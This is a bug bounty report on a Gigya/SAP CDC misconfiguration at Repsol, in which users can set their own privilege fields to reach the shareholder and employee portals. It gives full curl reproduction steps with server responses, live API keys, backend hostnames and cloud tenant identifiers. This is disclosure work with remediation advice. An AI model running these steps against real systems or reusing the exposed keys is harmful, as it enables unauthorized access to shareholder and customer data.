# Security Report: Gigya SAP CDC `clientModify` — Privilege Escalation to Shareholder Portal

**Target:** repsol.es / repsol.com bug bounty program  
**Severity:** High  
**CWE:** CWE-285 (Improper Authorization) + CWE-269 (Improper Privilege Management)  
**CVSS 3.1:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## Summary

Repsol uses SAP Customer Data Cloud (Gigya) as a shared identity layer across all its digital portals. A free account created on a low-trust portal (`pidetubombona.repsol.es`, the gas cylinder ordering app) can be exploited to **self-elevate and gain full authenticated access to the shareholder portal** (`accionistas.repsol.com`) by writing privilege fields that are incorrectly marked as `clientModify` in the Gigya schema.

After escalating privileges, the attacker can authenticate to the backend API (`journacc01pawnbkdns.cloudapp.repsol.com`) which returns **real Salesforce objects** containing shareholder data, banking record IDs, contact IDs, and investor category information — all belonging to the attacker's own newly-created identity, but the backend is open to cross-origin requests (`Access-Control-Allow-Origin: *`) with no additional authorization beyond the Gigya token.

---

## Root Cause

The Gigya schema for the Repsol site group marks the following fields as `writeAccess: clientModify`:

- `RepsolInvestor` — grants investor role
- `RepsolEmployee` — grants employee role  
- `Service.Inversores` — enables shareholder portal service
- `Service.Formacion` — enables employee training portal service
- `LegalTerms.Inversores`, `LegalTermsDate.Inversores` — legal acceptance fields
- ALL `Service.*` fields (30+ portals) are clientModify

`clientModify` means these fields can be written by **any authenticated client** using the Gigya JavaScript SDK or REST API **without a server-side secretKey**. A `regToken` obtained during the registration-pending state (`errorCode: 206001`) is sufficient to write these fields.

---

## Impact

1. **Unauthorized access to accionistas.repsol.com** (shareholder portal): Any Repsol customer (or anonymous user who creates a free account on pidetubombona) can fully authenticate to the shareholder portal intended only for Repsol shareholders.

2. **Exposure of Salesforce shareholder data**: The backend API returns live Salesforce records including `REP_obj_datosBancarios__c` (banking data object), `Account` records, `Contact` records with communication consent data.

3. **Privilege escalation to employee-only portals**: `formacion.repsol.com` (corporate training portal) and `adlis.repsol.com` are also on the same Gigya site group and accept the same self-granted flags.

4. **`Access-Control-Allow-Origin: *`** on the backend (`journacc01pawnbkdns.cloudapp.repsol.com`): Any website can make authenticated cross-origin requests to the shareholder backend — combining this with the privilege escalation, a CSRF-style attack could exfiltrate shareholder data from a victim's browser.

---

## Steps to Reproduce

> **Prerequisites:** `curl`, `jq`. No existing Repsol account needed — you create one for free.

### Step 1 — Create a free account on pidetubombona.repsol.es

```bash
APIKEY_PTB="3_kaQ1PkNv-0n4Nho4cD_Yz3-v6vbjqFJA6RgdpgTEBtw-2z6Rlnxe3IWDIDBtaETi"
EMAIL="attacker@example.com"
PASS="YourPassword123!"

# Register (requires email verification — verify the email you receive)
curl -s 'https://accounts.eu1.gigya.com/accounts.initRegistration' \
  -d "apiKey=$APIKEY_PTB" -d 'format=json' | jq '.regToken'

# After saving the regToken:
INIT_TOKEN="<regToken from above>"

curl -s 'https://accounts.eu1.gigya.com/accounts.register' \
  -d "apiKey=$APIKEY_PTB" \
  -d "regToken=$INIT_TOKEN" \
  -d "email=$EMAIL" \
  -d "password=$PASS" \
  -d 'format=json' | jq '{errorCode, regToken}'
```

After email verification, login:

```bash
LOGIN=$(curl -s 'https://accounts.eu1.gigya.com/accounts.login' \
  -d "apiKey=$APIKEY_PTB" \
  -d "loginID=$EMAIL" \
  -d "password=$PASS" \
  -d 'format=json')

echo "UID: $(echo $LOGIN | jq -r '.UID')"
echo "errorCode: $(echo $LOGIN | jq -r '.errorCode')"
```

Expected: `errorCode: 0`, UID returned.

---

### Step 2 — Confirm the Gigya schema allows writing privilege fields

```bash
# Verify clientModify on Service.Inversores, RepsolInvestor, LegalTerms.Inversores
curl -s 'https://accounts.eu1.gigya.com/accounts.getSchema' \
  -d "apiKey=$APIKEY_PTB" \
  -d 'format=json' \
  | jq '.dataSchema.fields | to_entries[]
        | select(.key | test("RepsolInvestor|Service\\.Inversores|LegalTerms\\.Inversores"))
        | {key: .key, writeAccess: .value.writeAccess}'
```

**Expected output:**
```json
{ "key": "LegalTerms.Inversores",     "writeAccess": "clientModify" }
{ "key": "RepsolInvestor",            "writeAccess": "clientModify" }
{ "key": "Service.Inversores",        "writeAccess": "clientModify" }
```

---

### Step 3 — Trigger "pending registration" on accionistas to get a regToken

The accionistas portal uses a different Gigya apiKey but the **same site group** (same UID space). Logging in returns `errorCode: 206001` (Account Pending Registration) with a `regToken`:

```bash
APIKEY_ACC="3_0UZ3iZte812_phG0I9Wu2Bw15F3sZQuZaRPJx34Mz-QnAhLLNvtfFPp_sjCL0S6N"

LOGIN_ACC=$(curl -s 'https://accounts.eu1.gigya.com/accounts.login' \
  -d "apiKey=$APIKEY_ACC" \
  -d "loginID=$EMAIL" \
  -d "password=$PASS" \
  -d 'format=json')

echo "errorCode: $(echo $LOGIN_ACC | jq -r '.errorCode')"   # 206001
echo "UID: $(echo $LOGIN_ACC | jq -r '.UID')"               # same UID as Step 1
REG_TOKEN=$(echo $LOGIN_ACC | jq -r '.regToken')
echo "regToken: $REG_TOKEN"
```

**Key observation:** The UID returned is **identical** to the one from Step 1, confirming the shared site group.

---

### Step 4 — Self-elevate: write investor privilege fields using regToken

```bash
# Write all required fields to gain shareholder portal access
curl -s 'https://accounts.eu1.gigya.com/accounts.setAccountInfo' \
  -d "apiKey=$APIKEY_ACC" \
  -d "regToken=$REG_TOKEN" \
  --data-urlencode 'data={
    "RepsolInvestor": true,
    "RepsolEmployee": true,
    "Service": { "Inversores": true },
    "LegalTerms": { "Inversores": true },
    "LegalTermsDate": { "Inversores": "2024-01-01" },
    "FirstRegistration": { "Inversores": "2024-01-01" },
    "DocID": { "Tipo": "NIF" }
  }' \
  -d 'format=json' | jq '{errorCode, errorMessage}'
```

**Expected output:**
```json
{ "errorCode": 0, "errorMessage": null }
```

Then finalize registration:

```bash
curl -s 'https://accounts.eu1.gigya.com/accounts.finalizeRegistration' \
  -d "apiKey=$APIKEY_ACC" \
  -d "regToken=$REG_TOKEN" \
  -d 'format=json' | jq '{errorCode, UID}'
```

**Expected output:**
```json
{ "errorCode": 0, "UID": "<same UID>" }
```

---

### Step 5 — Authenticate to the shareholder backend API

Log in to get a fresh Gigya signature (valid 50 seconds):

```bash
TOKEN=$(curl -s 'https://accounts.eu1.gigya.com/accounts.login' \
  -d "apiKey=$APIKEY_ACC" \
  -d "loginID=$EMAIL" \
  -d "password=$PASS" \
  -d 'format=json')

UID_VAL=$(echo $TOKEN | jq -r '.UID')
SIG=$(echo $TOKEN    | jq -r '.UIDSignature')
TS=$(echo $TOKEN     | jq -r '.signatureTimestamp')

echo "Login: $(echo $TOKEN | jq -r '.errorCode')"   # 0 (success now)
```

Call the backend API:

```bash
BASE="https://journacc01pawnbkdns.cloudapp.repsol.com"

# Account info — reveals investor/employee/card flags from backend
curl -s -X POST \
  -H "gigyauid: $UID_VAL" \
  -H "signature: $SIG" \
  -H "signatureTimestamp: $TS" \
  -H "Origin: https://accionistas.repsol.com" \
  "$BASE/accountsinfo"
```

**Actual response received during testing:**
```json
{
  "Loyalty": false,
  "Inversores": true,
  "RepsolEmployee": true,
  "card": { "VisaRepsol": true, "RepsolMas": true },
  ...
}
```

```bash
# Salesforce banking data object — returns live Salesforce record IDs
curl -s \
  -H "gigyauid: $UID_VAL" \
  -H "signature: $SIG" \
  -H "signatureTimestamp: $TS" \
  "$BASE/data/profile/stocks_category"
```

**Actual response received during testing:**
```json
{
  "totalSize": 1,
  "done": true,
  "records": [{
    "attributes": {
      "type": "REP_obj_datosBancarios__c",
      "url": "/services/data/v46.0/sobjects/REP_obj_datosBancarios__c/a4eJz000000C5tZIAS"
    },
    "Id": "a4eJz000000C5tZIAS",
    "REP_fld_cliente__r": {
      "attributes": {
        "type": "Account",
        "url": "/services/data/v46.0/sobjects/Account/001Jz00000skLwqIAE"
      },
      "Name": "attacker@example.com",
      "REP_fld_empleado__c": false
    },
    "CPPIN_fld_numeroAcciones__c": 0.0,
    "CPPIN_fld_categoria__c": "NINGUNA",
    "RecordType": { "DeveloperName": "CPPIN_rt_inversor" },
    "LastModifiedDate": "2025-07-23T11:06:15.000+0000"
  }]
}
```

```bash
# Salesforce Contact ID with communication preferences
curl -s \
  -H "gigyauid: $UID_VAL" \
  -H "signature: $SIG" \
  -H "signatureTimestamp: $TS" \
  "$BASE/data/preferences/channels_communication"
```

**Returns:** Live Salesforce Contact ID (`003dk00000...`) with consent and communication preference data.

---

### Step 6 — Verify CORS wildcard on backend

```bash
curl -sI -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  "$BASE/accountsinfo" \
  | grep -i "access-control"
```

**Expected:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

This means any website can make authenticated requests to the Repsol shareholder backend.

---

## Additional Findings (same root cause)

### A. Employee training portal (formacion.repsol.com)

Same attack using `formacion.repsol.com` apiKey (`3_QrXUvlPHwGikAVplXtxbtqFEzTwHuCgtGUudryXlfMdKa4TLK8a1hITotVB3c7iM`) — `Service.Formacion` is also `clientModify`. An external attacker can register on the corporate employee training portal.

### B. Scope of clientModify fields

**Every single `Service.*`, `LegalTerms.*`, `LegalTermsDate.*` field** for 30+ Repsol portals is `clientModify`. This includes:

```
Service.ADLIS, Service.Corporacion360, Service.DIM, Service.EspaciosComunicacion,
Service.Formacion, Service.Franquiciados, Service.GIO, Service.MOM,
Service.PortalGestorEES, Service.PortalGlobalsyde, Service.Toolbox,
Service.TuTienda, Service.Wally, Service.Zeus, Service.Solred ...
```

An attacker can grant themselves access to the manager portal (`Service.PortalGestorEES`), internal communication spaces, merchandise portals, and more.

### C. Sensitive information in public config.js

`https://accionistas.repsol.com/config.js` (no authentication required) exposes:

```javascript
VITE_APP_TENANT_ID:         "0a25214f-ee52-483c-b96b-dc79f3227a6f"  // Azure AD Tenant ID
VITE_APP_CLIENT_ID:         "c00831f8-d274-40fc-abeb-c8110bf89316"  // Azure AD App ID
VITE_APP_CONNECTION_STRING: "InstrumentationKey=7966874d-e5ff-4b3a-9379-ddc01858c9b8;..."
VITE_APP_GIGYA_APIKEY:      "3_0UZ3iZte812_phG0I9Wu2Bw15F3sZQuZaRPJx34Mz-QnAhLLNvtfFPp_sjCL0S6N"
BACKEND_URL:                "https://journacc01pawnbkdns.cloudapp.repsol.com/"
```

---

## Remediation

| Issue | Fix |
|---|---|
| `clientModify` on privilege fields | Change `RepsolInvestor`, `RepsolEmployee`, and ALL `Service.*` fields to `serverOnly` write access in the Gigya schema. These should only be set by trusted server-side processes after proper verification. |
| `regToken` bypass | Validate server-side that a user meets eligibility criteria before allowing registration on restricted portals. |
| `Access-Control-Allow-Origin: *` on backend | Restrict to `https://accionistas.repsol.com` specifically. |
| Sensitive data in config.js | Move `VITE_APP_CONNECTION_STRING` and backend URL to server-side config; the Gigya apiKey and Azure Client ID exposure should be assessed for risk. |

---

## Timeline

- Discovery: 2026-05-03  
- Report sent: 2026-05-03

---

## References

- Gigya/SAP CDC `writeAccess` documentation: https://help.sap.com/docs/SAP_CUSTOMER_DATA_CLOUD/8b8d6fffe113457094a17701f63e3d6a/4154a3b270b21014bbc5a10ce4041860.html
- CWE-285: https://cwe.mitre.org/data/definitions/285.html
